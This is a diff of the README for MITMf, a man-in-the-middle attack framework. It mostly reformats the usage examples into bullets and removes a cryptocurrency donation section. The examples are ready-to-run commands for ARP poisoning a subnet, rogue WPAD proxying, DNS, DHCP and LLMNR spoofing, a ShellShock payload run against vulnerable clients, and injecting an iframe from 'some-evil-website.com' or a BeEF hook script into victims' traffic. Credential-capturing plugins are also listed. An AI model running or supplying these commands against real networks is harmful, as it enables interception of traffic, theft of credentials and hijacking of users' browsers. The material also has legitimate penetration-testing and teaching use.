@@ -85,71 +85,72 @@ mitmf -i wlan0
 ```
 ----------------------------------------------------------------------
 
-The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:
+- The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:
 
 ```python mitmf.py -i enp3s0```
 
-ARP poison the whole subnet with the gateway at 192.168.1.1 using the **Spoof** plugin:
+- ARP poison the whole subnet with the gateway at 192.168.1.1 using the **Spoof** plugin:
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1```
 
-Same as above + a WPAD rogue proxy server using the **Responder** plugin:
+- Same as above + a WPAD rogue proxy server using the **Responder** plugin:
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpad```
 
-ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:
+- ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:
 
 ```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1```
 
-Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
+- Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
 
 ```python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
 
-Enable LLMNR/NBTNS/MDNS spoofing:
+- Enable LLMNR/NBTNS/MDNS spoofing:
 
 ```python mitmf.py -i enp3s0 --responder --wredir --nbtns```
 
-Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
+- Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
 
 ```python mitmf.py -i enp3s0 --spoof --dhcp```
 
-Same as above with a ShellShock payload that will be executed if any client is vulnerable:
+- Same as above with a ShellShock payload that will be executed if any client is vulnerable:
 
 ```python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'```
 
-Inject an HTML IFrame using the **Inject** plugin:
+- Inject an HTML IFrame using the **Inject** plugin:
 
 ```python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com```
 
-Inject a JS script:
+- Inject a JS script:
 
 ```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```
 
-Start a captive portal that redirects everything to http://SERVER/PATH:
+- Start a captive portal that redirects everything to http://SERVER/PATH:
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH```
 
-Start captive portal at http://your-ip/portal.html using default page /portal.html (thx responder) and /CaptiveClient.exe (not included) from the config/captive folder:
+- Start captive portal at http://your-ip/portal.html using default page /portal.html (thx responder) and /CaptiveClient.exe (not included) from the config/captive folder:
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive```
 
-Same as above but with hostname captive.portal instead of IP (requires captive.portal to resolve to your IP, e.g. via DNS spoof):
+- Same as above but with hostname captive.portal instead of IP (requires captive.portal to resolve to your IP, e.g. via DNS spoof):
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns```
 
-Serve a captive portal with an additional SimpleHTTPServer instance serving the LOCALDIR at http://IP:8080 (change port in mitmf.config):
+- Serve a captive portal with an additional SimpleHTTPServer instance serving the LOCALDIR at http://IP:8080 (change port in mitmf.config):
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR```
 
-Same as above but with hostname:
+- Same as above but with hostname:
 
 ```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns```
 
-And much much more! 
+- And much much more! 
 
 Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..)
 
 For a complete list of available options, just run ```python mitmf.py --help```
+
 
 # Currently available plugins
 
@@ -171,12 +172,3 @@ For a complete list of available options, just run ```python mitmf.py --help```
 - **SMBAuth**          : Evoke SMB challenge-response authentication attempts
 - **Upsidedownternet** : Flips images 180 degrees
 - **Captive**          : Creates a captive portal, redirecting HTTP requests using 302
-
-# How to fund my tea & sushi reserve
-
-BTC: 1ER8rRE6NTZ7RHN88zc6JY87LvtyuRUJGU
-
-ETH: 0x91d9aDCf8B91f55BCBF0841616A01BeE551E90ee
-
-LTC: LLMa2bsvXbgBGnnBwiXYazsj7Uz6zRe4fr
-
